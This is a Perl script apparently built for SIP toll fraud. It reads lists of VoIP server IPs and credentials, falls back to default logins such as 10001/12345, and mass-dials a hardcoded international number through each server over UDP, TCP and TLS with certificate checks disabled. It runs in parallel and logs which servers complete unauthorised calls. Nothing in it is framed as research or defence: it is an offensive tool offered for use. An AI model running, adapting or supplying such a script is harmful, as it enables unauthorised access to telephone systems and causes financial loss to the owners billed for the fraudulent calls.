use strict;
use warnings;
use Data::Dumper;
use IO::Socket::INET;
use Socket;
use Test::More;
use Net::SIP;
use Parallel::ForkManager;
use Term::ANSIColor;
use Time::HiRes qw(gettimeofday tv_interval);
use IO::Socket::SSL;

my $ip_file = $ARGV[0];
my $num = '972599422641';
my $proxy_file = 'prx';
my $filename = 'caller.log';
my $ring_time = '40';
my $max_processes = $ARGV[1];
my $timeout = $ARGV[2];

my $default_user = '10001';
my $default_pass = '12345';

if (@ARGV < 1) {
    print "[!] $0 <ip_file> <threads> <timeout>\r\n";
    exit;
}

my @ips = read_file($ip_file);
my @proxies = read_file($proxy_file);

my @ports = (5060, 5061, 5062);

my $pm = Parallel::ForkManager->new($max_processes);

foreach my $proxy (@proxies) {
    foreach my $line (@ips) {
        my $to = "$proxy$num";
        my ($ip, $user, $pass) = split(/ /, $line);
        $ip =~ s/\x0a//g;
        $user //= $default_user;
        $pass //= $default_pass;

        for my $protocol ('udp', 'tcp', 'tls') {
            for my $port (@ports) {
                my $pid = $pm->start and next;
                print color("bold red"), "$ip $user $pass $to $protocol $port\n";
                call($ip, $user, $pass, $to, $protocol, $port);
                $pm->finish;
            }
        }
    }
    print color("bold red"), "Switching $proxy$num \n";
}

$pm->wait_all_children();

sub read_file {
    my $file = shift;
    open my $handle, '<', $file or die "Cannot open file: $!";
    chomp(my @lines = <$handle>);
    close $handle;
    return @lines;
}

sub call {
    my $ip = shift;
    my $user = shift;
    my $pass = shift;
    my $to = shift;
    my $protocol = shift;
    my $port = shift;

    my $ua = Net::SIP::Simple->new(
        outgoing_proxy => "$protocol:$ip:$port",
        registrar => $ip,
        domain => $ip,
        from => $user,
        auth => [ $user, $pass ],
        leg => $protocol eq 'tls' ? { socktype => 'tls', ssl => { SSL_verify_mode => SSL_VERIFY_NONE } } : undef,
    );

    my $call;
    eval {
        local $SIG{ALRM} = sub { die "alarm\n" };
        alarm $timeout;
        $call = $ua->invite( $to,
            cb_established => sub {
                my $call = shift;
                print color("bold green"), "Call established to $ip\n";
                write_to_file('successful_results.log', "$ip $user $pass $to $protocol $port - Call established\n");
                $call->bye;
            },
            cb_cleanup => sub {
                my ($call, $reason) = @_;
                print color("bold red"), "Call terminated to $ip\n";
                write_to_file('successful_results.log', "$ip $user $pass $to $protocol $port - Call terminated\n");
            },
            cb_error => sub {
                my ($call, $error) = @_;
                print color("bold yellow"), "Error occurred to $ip: $error\n";
                write_to_file('failed_results.log', "$ip $user $pass $to $protocol $port - Error: $error\n");
            },
        );
        alarm 0;
    };
    if ($@) {
        if ($@ eq "alarm\n") {
            print color("bold yellow"), "Timeout occurred to $ip\n";
            write_to_file('failed_results.log', "$ip $user $pass $to $protocol $port - Timeout\n");
        }
        else {
            die; # propagate unexpected errors
        }
    }
}

sub write_to_file {
    my $filename = shift;
    my $line = shift;
    open(my $fh, '>>', $filename) or die "Could not open file '$filename' $!";
    print $fh "$line\n";
    close $fh;
}
